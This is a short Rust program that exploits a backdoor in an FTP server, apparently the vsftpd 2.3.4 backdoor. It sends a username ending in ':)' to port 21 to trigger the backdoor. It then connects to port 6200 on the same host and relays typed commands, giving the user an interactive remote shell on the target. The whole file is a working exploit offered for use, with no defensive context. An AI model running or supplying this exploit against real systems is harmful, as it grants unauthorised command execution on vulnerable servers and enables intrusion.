use std::net::{TcpStream, Shutdown};
use std::env::args;
use std::time::Duration;
use std::thread::sleep;
use std::io::{Write, Read, BufReader, BufRead, self};

fn trigger_backdoor(host : &str) {
    // Set variables
    let username = "USER hello:)\n";
    let password = "PASS pass\n";

    // Open TCP connection with FTP server
    println!("Triggering backdoor...");
    let mut stream = TcpStream::connect((host, 21))
        .unwrap_or_else(|_| panic!("[!] Could not connect to {} on port 21",host));

    println!("[+] Connection success");
    println!("Authenticating ...");

    // Sending username
    let response = username.as_bytes();
    stream.write(response)
        .expect("[!] Could not send username");
    sleep(Duration::new(1,0));

    // Sending password
    let response = password.as_bytes();
    stream.write(response)
        .expect("[!] Could not send password");
    
    sleep(Duration::new(1,0));
    println!("[+] Backdoor triggered successfully");

    // Closing the stream
    stream.shutdown(Shutdown::Both)
        .expect("[!] Could not close the socket");

}

fn connect_backdoor(host: &str)  {
    // Connecting to the backdoor
    println!("Connecting to backdoor...");
    sleep(Duration::new(1,0));

    let mut stream = TcpStream::connect((host, 6200))
        .unwrap_or_else(|_| panic!("[!] Could not connect to server {} on port 6200", host));
    println!("[+] Successfully connected to backdoor");
    println!("Type \"exit\" to cancel the connection");

    loop {
        // Starting the shell
        print!("> ");
        let _ = io::stdout().flush();

        // Getting user input
        let mut input = String::new();
        let _ = io::stdin().read_line(&mut input);

        // Cancel the loop if the user enter exit
        if input.trim_end().eq_ignore_ascii_case("exit") {
            break;
        }

        // Sending user command to remote server
        let command = input.as_bytes();
        stream.write(command)
            .expect("[!] Could not send command to server");

        // Receiving result and printing to user
        let mut buf = vec![0; 1024];
        let response = stream.read(&mut buf)
            .expect("[!] Failed to retrieve reponse from server");
        let reader = String::from_utf8_lossy(&buf);
        println!("{}", reader);

    }

}

fn main()  {
    let args : Vec<String> = args().collect();
    if args.len() < 2 {
        println!("Not enough arguments");
        println!("Usage : {} <IP-adress>", args[0]);
        return;
    }
    let host = &args[1];
    trigger_backdoor(&host);
    connect_backdoor(&host);

}
